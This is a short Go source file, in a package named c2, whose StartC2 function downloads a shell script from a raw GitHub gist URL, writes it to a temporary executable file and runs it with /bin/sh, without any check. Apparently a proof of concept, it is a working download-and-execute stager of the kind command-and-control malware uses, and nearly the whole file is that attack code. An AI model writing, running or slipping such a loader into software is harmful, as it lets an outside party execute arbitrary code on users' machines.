package c2

import (
	"io"
	"net/http"
	"os"
	"os/exec"
)

func StartC2() {
	url := "https://gist.githubusercontent.com/rroiii/56b6b9d8ace864bf66233e10b580f922/raw/b72f133f7de7502ae0a58f70906c77b6d8e217fa/poc-test.txt"

	resp, err := http.Get(url)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	tmpFile, err := os.CreateTemp("", "script-*.sh")
	if err != nil {
		panic(err)
	}
	defer os.Remove(tmpFile.Name())
	io.Copy(tmpFile, resp.Body)
	tmpFile.Chmod(0755)
	tmpFile.Close()

	cmd := exec.Command("/bin/sh", tmpFile.Name())
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		panic(err)
	}
}
